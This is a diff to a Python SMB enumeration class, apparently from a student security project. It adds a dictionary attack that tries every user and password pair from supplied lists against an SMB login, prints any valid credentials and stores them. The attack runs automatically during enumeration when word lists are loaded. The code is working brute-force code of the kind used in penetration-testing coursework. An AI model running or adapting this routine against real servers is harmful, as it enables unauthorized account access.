@@ -35,6 +35,68 @@ class SMBEnumerator:
         self.connection: Optional[SMBConnection] = None
         self.null_session_established = False
         self.error_message: Optional[str] = None
+        
+        # Atributos del Estudiante 3 para el ataque de diccionario
+        self.users_to_test: List[str] = []
+        self.passwords_to_test: List[str] = []
+        self.found_credentials: List[Dict[str, str]] = []
+
+    def load_dictionaries(self, users_list: List[str], passwords_list: List[str]) -> None:
+        """
+        Carga las listas de usuarios y contraseñas para el ataque de diccionario.
+
+        Args:
+            users_list (List[str]): Lista de usuarios a probar.
+            passwords_list (List[str]): Lista de contraseñas a probar.
+        """
+        self.users_to_test = users_list
+        self.passwords_to_test = passwords_list
+
+    def brute_force_login(self) -> List[Dict[str, str]]:
+        """
+        Realiza un ataque de diccionario contra el login de SMB (Estudiante 3).
+
+        Returns:
+            List[Dict[str, str]]: Lista de credenciales válidas encontradas.
+        """
+        if not HAS_PYSMB:
+            self.error_message = "La librería pysmb no está instalada. Ejecute: pip install pysmb"
+            print(f"[!] {self.error_message}")
+            return self.found_credentials
+
+        print(f"[*] Iniciando ataque de diccionario SMB contra {self.ip_address}:{self.port}...")
+        
+        for username in self.users_to_test:
+            for password in self.passwords_to_test:
+                try:
+                    # Intentamos conectarnos con las credenciales actuales
+                    conn = SMBConnection(
+                        username,
+                        password,
+                        "brute_force_client",
+                        self.ip_address,
+                        use_ntlm_v2=True,
+                        is_direct_tcp=(self.port == 445)
+                    )
+                    
+                    success = conn.connect(self.ip_address, self.port, timeout=2)
+                    
+                    if success:
+                        print(f"[!] ÉXITO (G2-E3): Credenciales válidas encontradas -> {username}:{password}")
+                        self.found_credentials.append({
+                            "user": username,
+                            "password": password
+                        })
+                        if username not in self.users:
+                            self.users.append(username)
+                            
+                    conn.close()
+                    
+                except Exception as e:
+                    logging.debug(f"Intento fallido para {username}:{password} -> {e}")
+                    
+        return self.found_credentials
+
 
     def establish_null_session(self) -> bool:
         """
@@ -127,13 +189,17 @@ class SMBEnumerator:
             else:
                 print("[!] No se logró establecer sesión nula.")
 
+            # Si hay diccionarios cargados, ejecutamos el ataque de fuerza bruta (Estudiante 3)
+            if self.users_to_test and self.passwords_to_test:
+                self.brute_force_login()
+
         finally:
             self.close_connection()
 
         return {
             "modulo": "Enumeracion SMB",
             "grupo": 2,
-            "estudiante": "E1",
+            "estudiante": "E1/E3",
             "target": self.ip_address,
             "timestamp": datetime.datetime.now().isoformat(),
             "status": "success",
@@ -141,10 +207,12 @@ class SMBEnumerator:
                 "port": self.port,
                 "null_session_established": self.null_session_established,
                 "shares": self.shares,
-                "users": self.users
+                "users": self.users,
+                "credenciales_encontradas": self.found_credentials
             },
             "error_message": self.error_message
         }
+
 
 
 if __name__ == "__main__":
